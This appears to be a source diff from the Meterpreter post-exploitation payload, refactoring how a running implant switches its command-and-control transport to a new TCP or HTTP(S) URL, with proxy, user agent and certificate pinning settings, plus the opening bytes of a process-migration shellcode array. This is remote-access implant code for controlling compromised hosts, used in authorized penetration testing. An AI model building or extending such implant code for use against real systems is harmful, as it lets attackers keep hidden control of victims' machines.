@@ -1,5 +1,6 @@
 #include "common.h"
 #include "base_inject.h"
+#include "../../../config.h"
 
 // see '/msf3/external/source/shellcode/windows/x86/src/migrate/migrate.asm'
 BYTE migrate_stub_x86[] =	"\xFC\x8B\x74\x24\x04\x81\xEC\x00\x20\x00\x00\xE8\x89\x00\x00\x00"
@@ -61,21 +62,15 @@ typedef struct _MIGRATECONTEXT
 
 BOOL remote_request_core_transport_change(Remote* remote, Packet* packet, DWORD* pResult)
 {
-	DWORD result = ERROR_NOT_ENOUGH_MEMORY;
+	Transport* transport = NULL;
 	Packet* response = packet_create_response(packet);
-	UINT transportType = packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_TYPE);
 	wchar_t* transportUrl = packet_get_tlv_value_wstring(packet, TLV_TYPE_TRANS_URL);
 
 	TimeoutSettings timeouts;
-	//timeouts.expiry = (int)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_SESSION_EXP);
 	timeouts.comms = (int)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_COMM_TIMEOUT);
 	timeouts.retry_total = (DWORD)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_RETRY_TOTAL);
 	timeouts.retry_wait = (DWORD)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_RETRY_WAIT);
 
-	//if (timeouts.expiry == 0)
-	//{
-	//	timeouts.expiry = remote->transport->timeouts.expiry;
-	//}
 	if (timeouts.comms == 0)
 	{
 		timeouts.comms = remote->transport->timeouts.comms;
@@ -89,12 +84,12 @@ BOOL remote_request_core_transport_change(Remote* remote, Packet* packet, DWORD*
 		timeouts.retry_wait = remote->transport->timeouts.retry_wait;
 	}
 
-	dprintf("[CHANGE TRANS] Type: %u", transportType);
 	dprintf("[CHANGE TRANS] Url: %S", transportUrl);
-	//dprintf("[CHANGE TRANS] Expiration: %d", timeouts.expiry);
 	dprintf("[CHANGE TRANS] Comms: %d", timeouts.comms);
 	dprintf("[CHANGE TRANS] Retry Total: %u", timeouts.retry_total);
 	dprintf("[CHANGE TRANS] Retry Wait: %u", timeouts.retry_wait);
+
+	*pResult = ERROR_NOT_ENOUGH_MEMORY;
 
 	do
 	{
@@ -104,40 +99,82 @@ BOOL remote_request_core_transport_change(Remote* remote, Packet* packet, DWORD*
 			break;
 		}
 
-		if (transportType == METERPRETER_TRANSPORT_SSL)
+		if (wcsncmp(transportUrl, L"tcp", 3) == 0)
 		{
-			//remote->next_transport = remote->trans_create_tcp(transportUrl, &timeouts);
+			MetsrvTransportTcp config = { 0 };
+			config.common.comms_timeout = timeouts.comms;
+			config.common.retry_total = timeouts.retry_total;
+			config.common.retry_wait = timeouts.retry_wait;
+			memcpy(config.common.url, transportUrl, sizeof(config.common.url));
+			transport = remote->trans_create(remote, &config.common, NULL);
 		}
 		else
 		{
-			BOOL ssl = transportType == METERPRETER_TRANSPORT_HTTPS;
+			BOOL ssl = wcsncmp(transportUrl, L"https", 5) == 0;
 			wchar_t* ua = packet_get_tlv_value_wstring(packet, TLV_TYPE_TRANS_UA);
 			wchar_t* proxy = packet_get_tlv_value_wstring(packet, TLV_TYPE_TRANS_PROXY_INFO);
 			wchar_t* proxyUser = packet_get_tlv_value_wstring(packet, TLV_TYPE_TRANS_PROXY_USER);
 			wchar_t* proxyPass = packet_get_tlv_value_wstring(packet, TLV_TYPE_TRANS_PROXY_PASS);
 			PBYTE certHash = packet_get_tlv_value_raw(packet, TLV_TYPE_TRANS_CERT_HASH);
 
-			//remote->next_transport = remote->trans_create_http(ssl, transportUrl, ua, proxy,
-			//	proxyUser, proxyPass, certHash, &timeouts);
+			MetsrvTransportHttp config = { 0 };
+			config.common.comms_timeout = timeouts.comms;
+			config.common.retry_total = timeouts.retry_total;
+			config.common.retry_wait = timeouts.retry_wait;
+			memcpy(config.common.url, transportUrl, sizeof(config.common.url));
 
-			SAFE_FREE(ua);
-			SAFE_FREE(proxy);
-			SAFE_FREE(proxyUser);
-			SAFE_FREE(proxyPass);
+			if (proxy)
+			{
+				memcpy(config.proxy.hostname, proxy, sizeof(config.proxy.hostname));
+				free(proxy);
+			}
+
+			if (proxyUser)
+			{
+				memcpy(config.proxy.username, proxyUser, sizeof(config.proxy.username));
+				free(proxyUser);
+			}
+
+			if (proxyPass)
+			{
+				memcpy(config.proxy.password, proxyPass, sizeof(config.proxy.password));
+				free(proxyPass);
+			}
+
+			if (ua)
+			{
+				memcpy(config.ua, ua, sizeof(config.ua));
+				free(ua);
+			}
+
+			if (certHash)
+			{
+				memcpy(config.ssl_cert_hash, certHash, sizeof(config.ssl_cert_hash));
+				// No need to free this up as it's not a wchar_t
+			}
+
+			transport = remote->trans_create(remote, &config.common, NULL);
 		}
 
 		// tell the server dispatch to exit, it should pick up the new transport
-		result = ERROR_SUCCESS;
+		*pResult = ERROR_SUCCESS;
 	} while (0);
 
 	if (packet)
 	{
-		packet_transmit_empty_response(remote, response, result);
+		packet_transmit_empty_response(remote, response, *pResult);
 	}
 
 	SAFE_FREE(transportUrl);
 
-	return result == ERROR_SUCCESS ? FALSE : TRUE;
+	if (*pResult == ERROR_SUCCESS)
+	{
+		remote->next_transport = transport;
+		// exit out of the dispatch loop.
+		return FALSE;
+	}
+
+	return TRUE;
 }
 
 /*!
